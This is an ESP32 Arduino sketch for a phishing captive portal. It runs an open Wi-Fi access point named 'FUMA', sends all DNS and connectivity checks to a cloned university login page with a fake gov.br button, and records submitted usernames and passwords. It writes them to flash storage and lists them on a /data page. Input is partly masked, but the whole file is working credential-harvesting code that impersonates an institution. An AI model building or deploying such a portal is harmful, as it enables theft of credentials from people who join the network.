#include <WiFi.h>
#include <DNSServer.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>

#define LED_PIN 2

const byte DNS_PORT = 53;
DNSServer dnsServer;
AsyncWebServer server(80);

const char* ssid = "FUMA";
const char* password = "";

// Página de login
const char* loginPage = R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>FUMA - Autenticação Integrada</title>
  <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        height: 100vh;
        overflow: hidden;
      }
      .background {
        background: linear-gradient(to bottom, #e8eef7 0%, #d4e0f0 100%);
        height: 300px;
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: -1;
      }
      .top-bar {
        background-color: #0066cc;
        height: 8px;
        width: 100%;
      }
      .header {
        background-color: white;
        padding: 10px 20px;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 60px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }
      .header img {
        width: 60px;
        height: 60px;
        margin-right: 15px;
      }
      .header h1 {
        color: #333;
        font-size: 18px;
        font-weight: bold;
        letter-spacing: 0.5px;
      }
      .main-content {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
        position: relative;
        min-height: 0;
      }
      .login-container {
        background: white;
        border-radius: 8px;
        padding: 30px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        width: 100%;
        max-width: 400px;
        position: relative;
      }
      .login-title {
        text-align: center;
        color: #a8b8d0;
        font-size: 14px;
        font-weight: normal;
        letter-spacing: 2px;
        margin-bottom: 30px;
        text-transform: uppercase;
      }
      .form-group {
        margin-bottom: 20px;
      }
      .form-group label {
        display: block;
        color: #333;
        font-size: 14px;
        margin-bottom: 8px;
        font-weight: normal;
      }

      .form-group input {
        width: 100%;
        padding: 12px;
        border: 1px solid #ddd;
        border-radius: 4px;
        font-size: 14px;
        color: #666;
        font-style: normal;
      }

      .form-group input::placeholder{
        font-style: italic;
      }

      .form-group input:focus {
        outline: none;
        border-color: #000000;
      }
      .btn-primary {
        width: 100%;
        background-color: #0066cc;
        color: white;
        border: none;
        padding: 12px;
        border-radius: 25px;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        margin-bottom: 15px;
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
      }
      .btn-primary:hover {
        background-color: #0052a3;
      }
      .btn-secondary {
        width: 100%;
        background-color: #2b5cb0;
        color: white;
        border: none;
        padding: 12px;
        border-radius: 25px;
        font-size: 14px;
        font-weight: bold;
        cursor: pointer;
        margin-bottom: 20px;
      }
      .btn-secondary:hover {
        background-color: #1e4080;
      }
      .links {
        text-align: center;
      }
      .links a {
        color: #0066cc;
        text-decoration: none;
        font-size: 13px;
        display: block;
        margin-bottom: 8px;
      }
      .links a:hover {
        text-decoration: underline;
      }
      .warning-box {
        position: absolute;
        right: 20px;
        top: 50%;
        transform: translateY(-50%);
        background-color: #fff3cd;
        border: 1px solid #ffeaa7;
        border-radius: 4px;
        padding: 15px;
        width: 280px;
        font-size: 12px;
        color: #856404;
        line-height: 1.4;
      }
      .footer {
        background-color: #f8f9fa;
        padding: 15px 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-top: 1px solid #e9ecef;
        font-size: 12px;
        color: #666;
        min-height: 80px;
      }
      .footer-left {
        display: flex;
        align-items: center;
      }
      .footer img {
        width: 80px;
        height: auto;
        margin-right: 15px;
      }
      .lock-icon {
        width: 16px;
        height: 16px;
        fill: currentColor;
      }
      @media (max-width: 768px) {
        .warning-box {
          position: static;
          transform: none;
          margin-top: 20px;
          width: 100%;
          max-width: 400px;
        }
        .main-content {
          flex-direction: column;
          align-items: center;
        }
        .header h1 {
          font-size: 16px;
        }
        .footer {
          flex-direction: column;
          text-align: center;
          gap: 10px;
        }
      }
  </style>
</head>
<body>
  <div class="top-bar"></div>
    <header class="header">
      <!-- <img src="" alt="Brasão FUMA" /> -->
      <h1>FEDERAL UNIVERSIDADE DO MARANHÃO</h1>
    </header>
  <main class="main-content">
    <div class="background"></div>
    <div class="login-container">
      <h2 class="login-title">Autenticação Integrada</h2>
      <form action="/login" method="post">
        <div class="form-group">
          <label for="email">Nome de usuário:</label>
          <input type="text" id="email" name="email" placeholder="Digite seu login" />
        </div>
        <div class="form-group">
          <label for="password">Senha:</label>
          <input type="password" id="password" name="pass" placeholder="Digite sua senha" />
        </div>
        <button type="submit" class="btn-primary">ENTRAR</button>
        <button type="button" class="btn-secondary">Entrar com gov.br</button>
      </form>
      <div class="links">
        <a href="#">Esqueceu a senha?</a>
      </div>
    </div>
    <div class="warning-box">
      Por razões de segurança, por favor deslogue e feche o seu navegador quando terminar de acessar os sistemas que precisam de autenticação!
    </div>
  </main>
  <footer class="footer">
    <div class="footer-left">
      <!-- <img src="" alt="STI Logo" /> -->
    </div>
    <div>
      Superintendêntendência de Tecnologia da Informação | +55 0800 770 7900 | Copyright © 2006 - 2025 FUMA
    </div>
  </footer>
</body>
</html>
)rawliteral";

// Função para mascarar entradas, mostrando só 1º e último caractere
String mask(String input) {
  if (input.length() < 2) return "*";
  String result = input.substring(0, 1);
  for (int i = 0; i < input.length() - 2; i++) result += "*";
  result += input.substring(input.length() - 1);
  return result;
}

// Salva o email e senha mascarados no arquivo data.txt
void saveLogin(String email, String pass) {
  File file = SPIFFS.open("/data.txt", FILE_APPEND);
  if (!file) return;
  file.printf("Email: %s | Senha: %s\n", email.c_str(), pass.c_str());
  file.close();
}

void setup() {
  Serial.begin(115200);
  delay(1000);

  if (!SPIFFS.begin(true)) {
    Serial.println("Falha ao montar SPIFFS");
    return;
  }

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  WiFi.softAP(ssid, password);
  delay(100);

  Serial.println("Ponto de acesso iniciado!");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());

  // Serve a página de login
  server.on("/", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->send(200, "text/html", loginPage);
  });

  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->redirect("/");
  });

  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* request) {
    request->redirect("/");
  });

  server.onNotFound([](AsyncWebServerRequest* request) {
    request->redirect("/");
  });

  // Processa o login postado
  server.on("/login", HTTP_POST, [](AsyncWebServerRequest* request) {
    String email = request->getParam("email", true)->value();
    String pass = request->getParam("pass", true)->value();

    String maskedemail = mask(email);
    String maskedPass = mask(pass);

    Serial.printf("Login recebido:\n  Usuário: %s\n  Senha: %s\n", maskedemail.c_str(), maskedPass.c_str());

    saveLogin(maskedemail, maskedPass);

    // Pisca o LED ao receber o login

    digitalWrite(LED_PIN, HIGH);
    delay(200);
    digitalWrite(LED_PIN, LOW);
    delay(200);

    // Página de sucesso após login
    request->send(200, "text/html", R"rawliteral(
<!DOCTYPE html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>FUMA - Login Efetuado</title>
    <style>
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      body {
        font-family: Arial, sans-serif;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        background: linear-gradient(to bottom, #e8eef7 0%, #d4e0f0 100%);
      }
      .top-bar {
        background-color: #0066cc;
        height: 8px;
        width: 100%;
      }
      .header {
        background-color: white;
        padding: 10px 20px;
        display: flex;
        justify-content: center;
        align-items: center; 
        height: 60px;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
      }
      .header img {
        width: 60px;
        height: 60px;
        margin-right: 15px;
      }
      .header h1 {
        color: #333;
        font-size: 18px;
        font-weight: bold;
        letter-spacing: 0.5px;
      }
      .main-content {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
        padding: 20px;
      }
      .success-box {
        background: white;
        padding: 40px 30px;
        border-radius: 8px;
        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        max-width: 420px;
        width: 100%;
        text-align: center;
      }
      .success-box h2 {
        color: #0066cc;
        margin-bottom: 15px;
        font-size: 22px;
      }
      .success-box p {
        color: #444;
        font-size: 15px;
        margin-bottom: 10px;
      }
      .footer {
        background-color: #f8f9fa;
        padding: 15px 20px;
        display: flex;
        align-items: center;
        justify-content: center;
        border-top: 1px solid #e9ecef;
        font-size: 12px;
        color: #666;
        min-height: 80px;
      }
      .footer-left {
        display: flex;
        align-items: center;
      }
      .footer img {
        width: 80px;
        height: auto;
        margin-right: 15px;
      }
      @media (max-width: 768px) {
        .header h1 {
          font-size: 16px;
        }
        .footer {
          flex-direction: column;
          text-align: center;
          gap: 10px;
        }
      }
    </style>
  </head>
  <body>
    <div class="top-bar"></div>
    <header class="header">
      <!-- <img src="" alt="Brasão FUMA" /> -->
      <h1>FEDERAL UNIVERSIDADE DO MARANHÃO</h1>
    </header>
    <main class="main-content">
      <div class="success-box">
        <h2>Login efetuado com sucesso!</h2>
        <p>Você está conectado à rede <strong>FUMA</strong>.</p>
        <p>Agora você pode fechar esta aba.</p>
      </div>
    </main>
    <footer class="footer">
      <div class="footer-left">
        <!-- <img src="" alt="STI Logo" /> -->
      </div>
      <div>
      Superidisintendência de Tecnologia da Informação | +55 0800 770 7900 | Copyright © 2006 - 2025 FUMA
      </div>
    </footer>
  </body>
</html>
)rawliteral");
  });

  // Exibe os dados salvos (usuários e senhas mascaradas)
server.on("/data", HTTP_GET, [](AsyncWebServerRequest* request) {
    String response = "<h1>Saved Login Data</h1>";
    response += "<table border=\"1\" cellpadding=\"5\" cellspacing=\"0\">";
    response += "<thead><tr><th>Email</th><th>Senha</th></tr></thead>";
    response += "<tbody>";

    File file = SPIFFS.open("/data.txt");
    if (file && file.size() > 0) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) {
                int emailIndex = line.indexOf("Email: ");
                int passIndex = line.indexOf(" | Senha: ");
                if (emailIndex >= 0 && passIndex > emailIndex) {
                    String email = line.substring(emailIndex + 7, passIndex);
                    email.trim();
                    String pass = line.substring(passIndex + 10);
                    pass.trim();
                    response += "<tr><td>" + email + "</td><td>" + pass + "</td></tr>";
                }
            }
        }
        file.close();
    } else {
        response += "<tr><td colspan=\"2\">No data found</td></tr>";
    }

    response += "</tbody></table><br><br>";
    response += "<div style=\"display: flex; gap: 10px;\">";
    response += "<form method=\"GET\" action=\"/data\">";
    response += "<button type=\"submit\">Refresh Data</button>";
    response += "</form>";
    response += "<form method=\"POST\" action=\"/erase\">";
    response += "<button type=\"submit\">Erase Data</button>";
    response += "</form>";
    response += "</div>";

    request->send(200, "text/html", response);
});

  // Apaga o arquivo de dados quando solicitado
  server.on("/erase", HTTP_POST, [](AsyncWebServerRequest* request) {
    if (SPIFFS.exists("/data.txt")) {
      SPIFFS.remove("/data.txt");
    }
    request->redirect("/data");
  });

  server.begin();
}

void loop() {
  dnsServer.processNextRequest();
}